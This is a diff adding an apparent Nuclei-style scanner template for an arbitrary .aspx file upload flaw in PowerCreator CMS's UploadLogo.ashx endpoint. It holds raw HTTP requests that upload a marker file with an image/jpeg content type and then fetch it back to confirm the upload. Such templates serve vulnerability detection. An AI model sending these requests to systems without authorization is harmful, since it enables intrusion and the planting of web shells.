@@ -1,0 +1,42 @@
+id: PowerCreator-CMS-UploadLogo-upload
+info:
+  name: PowerCreator CMS UploadLogo存在任意文件上传漏洞
+  author: apple
+  severity: critical
+  description: PowerCreator CMS UploadLogo存在任意文件上传漏洞
+  reference:
+    - https://
+  tags: tags
+  
+variables:
+  filename: "{{rand_base(6)}}" 
+  
+http:
+  - raw:
+      - |
+        POST /upload/UploadLogo.ashx?fileName={{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+        Connection: close
+        Content-Length: 245
+        Content-Disposition: form-data;name="file1";filename="poc.aspx";
+        Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
+        Accept-Encoding: gzip, deflate
+
+        -----------------------------20873900192357278038549710136
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.aspx"
+        Content-Type: image/jpeg
+
+        whoisceshi
+        -----------------------------20873900192357278038549710136--
+      - |-
+        GET /images/logo/{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip, deflate
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'whoisceshi'
